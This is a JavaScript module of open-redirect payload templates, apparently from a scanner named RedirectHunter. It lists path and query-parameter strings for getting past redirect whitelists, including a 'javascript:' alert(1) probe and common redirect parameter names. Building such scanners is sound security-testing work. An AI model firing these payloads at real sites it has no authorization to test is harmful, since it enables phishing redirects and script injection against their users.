'use strict';

/**
 * Payload templates. Placeholders:
 *   {d} - canary domain (e.g. rh-canary.example)
 *   {h} - hostname of the target (for whitelist-bypass tricks)
 *
 * PATH_PAYLOADS are appended to the URL path (original RedirectHunter behaviour,
 * works against servers that redirect on malformed paths like //evil.com).
 * PARAM_PAYLOADS are substituted into a query-parameter value.
 */
const PATH_PAYLOADS = [
  '///{d}', '/@{d}', '/{d}', '/{d}/', '//{d}', '//{d}/',
  '/http://{d}', '//http://{d}', '///http://{d}/',
  '/>/{d}', '/>//{d}/', '/<>/{d}', '/<>//{d}/',
  '//#//{d}', '//#/https://{d}',
  '//{d}/%2f%2e%2e', '//https://{d}/%2e%2e', '////https://{d}/%2f%2e%2e',
  '//;{d}/', '//;https://{d}/',
  '//%09/{d}', '//%09/https://{d}',
  '//%5c{d}', '/%5C%5C{d}/%252e%252e%252f',
  '//{d}/..;/css', '//%EF%B9%B0/{d}',
  '/?url=http://{d}'
];

const PARAM_PAYLOADS = [
  'https://{d}', 'http://{d}', '//{d}', '///{d}', '////{d}',
  '/\\{d}', '\\\\{d}', '/\\/{d}', 'https:{d}', 'https:/{d}', 'https:\\\\{d}',
  '//{d}/%2f..', '//%09/{d}', '//%5c{d}',
  'https://{h}@{d}', 'https://{h}.{d}', 'https://{d}?{h}', 'https://{d}#{h}',
  'https://{d}\\@{h}', '//{d}%00.{h}', 'https://{d}%2f%2e%2e',
  'javascript://{h}/%0aalert(1)'
];

// Parameter names commonly used for redirects (used with --common-params)
const COMMON_PARAMS = [
  'url', 'next', 'redirect', 'redirect_url', 'redirect_uri', 'return',
  'return_url', 'returnTo', 'return_to', 'continue', 'dest', 'destination',
  'goto', 'target', 'to', 'out', 'view', 'login_url', 'image_url',
  'callback', 'forward', 'rurl', 'success_url', 'error_url', 'checkout_url'
];

function fill(tpl, ctx) {
  return tpl.replace(/\{d\}/g, ctx.domain).replace(/\{h\}/g, ctx.host || 'example.com');
}

module.exports = { PATH_PAYLOADS, PARAM_PAYLOADS, COMMON_PARAMS, fill };
